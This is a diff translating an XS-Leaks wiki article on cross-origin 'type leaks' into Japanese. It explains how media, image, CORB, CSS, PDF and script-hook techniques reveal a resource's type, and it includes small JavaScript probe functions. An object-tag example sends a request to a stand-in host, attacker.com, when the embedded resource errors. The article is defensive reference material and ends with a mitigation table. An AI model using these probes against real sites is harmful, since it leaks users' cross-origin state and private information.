@@ -12,20 +12,21 @@ menu = "main"
 weight = 2
 +++
 
-Some HTML Elements might be used to leak a portion of data to a cross-origin page.
-For example, the below media resources can leak information about its size, duration, type. 
+一部のHTML要素は、クロスオリジンのページにデータの一部をリークさせるために使用される可能性があります。 
+たとえば、以下のようなメディアリソースは、サイズ、期間、種類に関する情報をリークさせる可能性があります。
 
-- [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) leaks the media `duration` and the `buffered` times.
-- [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) leaks the `videoHeight` and `videoWidth` 
-  some browsers may also have `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` and `webkitDecodedFrameCount`
-- [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) leaks the `totalVideoFrames`.
-- [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) leaks the `height` and `width` but if the image is invalid they will be 0 
-  and [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) will get rejected.
+- [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)は、メディアの`duration`と`buffered`の時間をリークします。
+- [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) は`videoHeight`と`videoWidth`をリークします。一部のブラウザでは、`webkitVideoDecodedByteCount`、 `webkitAudioDecodedByteCount`、`webkitDecodedFrameCount`も含む可能性があります
+- [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)は`totalVideoFrames`をリークします。
+- [HTMLImageElement]（https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement）は`height`と`width`をリークしますが、画像が無効な場合には、それらは0となり、[`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode)は拒否されます。
 
-It's possible to differentiate between media types via unique property for a given media type. For example, it is `videoWidth` for a `<video>`, or `duration` for an `<audio>`. The below snippet shows an example code that returns the type of a resource. 
+メディアタイプの固有のプロパティによって、メディアタイプを区別することができます。
+たとえば、`<video>`の場合は`videoWidth`、`<audio>`の場合は`duration`といった具合です。 
+以下のコードは、リソースの種類を返すサンプルコードを示しています。
+
 ```javascript
 async function getType(url) {
-    // Detect if resource is audio or video
+    // リソースがaudioもしくはvideoかどうかを検知
     let media = document.createElement("video");
     media.src = url;
     await new Promise(r=>setTimeout(r,50));
@@ -34,7 +35,7 @@ async function getType(url) {
     } else if (media.duration) {
     return "audio"
     }
-    // Detect if resource is an image
+    // リソースがimageかどうかを検知
     let image = new Image();
     image.src = url;
     await new Promise(r=>setTimeout(r,50));
@@ -42,33 +43,36 @@ async function getType(url) {
 }
 ```
 
-## Abusing CORB
-[CORB]({{< ref "/docs/attacks/browser-features/corb.md" >}}) is a feature of Chrome that makes responses empty if the wrong content type is used.
-This means that if the type is wrong it’s not cached.
-An `ifCached` function can be found in [Cache Probing]({{< ref "/docs/attacks/cache-probing.md" >}}) article.
+## CORBの悪用
+
+[CORB]({{< ref "/docs/attacks/browser-features/corb.md" >}}) は、間違ったコンテンツタイプが使用された場合にレスポンスを空にするChromeの機能です。
+これは、コンテンツタイプが間違っている場合、キャッシュされないことを意味します。
+ `ifCached` 関数については[Cache Probing]({{< ref "/docs/attacks/cache-probing.md" >}})の記事にて確認できます。
+
 ```javascript
 async function isType(url, type = "script") {
   let error = false;
-  // Purge url
+  // urlをパージする
   await ifCached(url, true);
-  // Attempt to load resource
+  // リソースの読み込みを試行
   let e = document.createElement(type);
   e.onerror = () => error = true;
   e.src = url;
   document.head.appendChild(e);
-  // Wait for it to be cached if its allowed by CORB
+  // CORBで許可されていれば、キャッシュされるのを待つ
   await new Promise(resolve => setTimeout(resolve, 500));
-  // Cleanup
+  // クリーンアップ
   document.head.removeChild(e);
-  // Fix for "images" that get blocked differently.
+  // ブロックされた"images"の修正
   if (error) return false
   return ifCached(url);
 }
 ```
 
-## Abusing getComputedStyle
-[getComputedStyle](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) can be used to read an embedded to the current page CSS style sheets. Including those loaded from different origins. 
-This function just checks if there has been a style applied to the body.
+[getComputedStyle](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)は、現在のページに埋め込まれたCSSスタイルシートを読み取るために使用することができます。
+これは異なるオリジンから読み込まれたものも含みます。
+この関数は、ボディに適用されたスタイルがあるかどうかをチェックするだけのものです。
+
 ```javascript
 async function isCSS(url) {
     let link = document.createElement('link');
@@ -83,9 +87,11 @@ async function isCSS(url) {
     return (style1 !== style2);
 }
 ```
+
 ## PDF
-There are [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) that allow some control over the content such as `zoom`, `view`, `page`, `toolbar`.  
-For chrome, a PDF can be detected with [frame counting]({{< ref "/docs/attacks/frame-counting.md" >}}) because an `embed` is used internally.
+ [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113)には、`zoom`, `view`, `page`, `toolbar` などのコンテンツを制御することができるものが用意されています。 
+chromeの場合、内部で`embed`を使用しているため、[frame counting]({{< ref "/docs/attacks/frame-counting.md" >}})でPDFを検出することが可能です。
+
 ```javascript
 async function isPDF(url) {
     let w = open(url);
@@ -95,10 +101,13 @@ async function isPDF(url) {
     return result;
 }
 ```
-{{< hint warning  >}} There will be false positives if the page has other embeds. {{< /hint >}}
 
-## Script tag
-When a cross-origin script is included on a page it's not directly possible to read its contents. However, if a script uses any built-in functions, it's possible to overwrite them and read their arguments which might leak valuable information [^script-leaks].
+{{< hint warning  >}} } ページに他の埋め込みがある場合、誤検知が発生します。 {{< /hint >}}
+
+## スクリプトタグ
+クロスオリジンのスクリプトがページに含まれる場合、その内容を直接読み取ることはできません。
+しかし、スクリプトが組み込み関数を使用している場合には、関数を上書きすることでその引数を読むことができるため、機密情報をリークする可能性があります[^script-leaks]。
+
 ```javascript
 let hook = window.Array.prototype.push;
 window.Array.prototype.push = function() {
@@ -107,21 +116,27 @@ window.Array.prototype.push = function() {
 }
 ```
 
-## When Javascript can’t be used
-If JavaScript is disabled it's still possible to leak some information about cross-origin resources. For example, an `<object>` can be used to detect whether a resource responds with *Error Code*. What happens is that if a resource `//example.org/resource` returns an error in `<object data=//example.org/resource>fallback</object>` then `fallback` will be rendered [^fallback] [^leaky-images]. It's possible to inject another `<object>` inside that will leak the information to an outside server, or detect it with CSS [^xsleaks-nojs].
-The below code embeds `//example.org/404` and if it responds with *Error* then a request to `//attacker.com/?error` is also made as a fallback.
+## Javascriptが使用できない場合
+
+JavaScriptが無効な場合でも、クロスオリジンのリソースに関するいくつかの情報が漏えいする可能性があります。
+例えば、`<object>` を利用して、リソースがエラーコードで応答するかどうかを検出することができます。
+リソース`//example.org/resource`が`<object data=//example.org/resource>fallback</object>`でエラーを返した場合、`fallback`がレンダリングされます[^fallback] [^leaky-images]。
+内部に別の`<object>`を挿入して情報を外部サーバーにリークしたり、CSS[^xsleaks-nojs]で検出したりすることができます。
+以下のコードは `//example.org/404` を埋め込み、それが *Error* で応答した場合、 フォールバックとして`//attacker.com/?error` へのリクエストも行われます。
+
 ```html
 <object data="//example.com/404">
   <object data="//attacker.com/?error"></object>
 </object>
 ```
 
-## Defense
+## 対策
 
 | Attack Alternative | [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                                          [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                                           |
 | :----------------: | :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: |
-|     Type leaks     |                                         ✔️                                         |                         ❌                          |                                ❌                                 | [RIP]({{< ref "/docs/defenses/isolation-policies/resource-isolation" >}}) 🔗 [NIP]({{< ref "/docs/defenses/isolation-policies/navigation-isolation" >}}) |
-## References
+| Type leaks |                                         ✔️                                         |                         ❌                          |                                ❌                                 | [RIP]({{< ref "/docs/defenses/isolation-policies/resource-isolation" >}}) 🔗 [NIP]({{< ref "/docs/defenses/isolation-policies/navigation-isolation" >}}) |
+
+## 参考文献
 [^script-leaks]: The Unexpected Dangers of Dynamic JavaScript. [link](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf)   
 [^fallback]: HTML Standard, [3.2.5.2.6 Embedded content], [link](https://html.spec.whatwg.org/multipage/dom.html#fallback-content)  
 [^leaky-images]: Leaky Images: Targeted Privacy Attacks in the Web, [3.4 Linking User Identities], [link](https://www.usenix.org/system/files/sec19fall_staicu_prepub.pdf)  
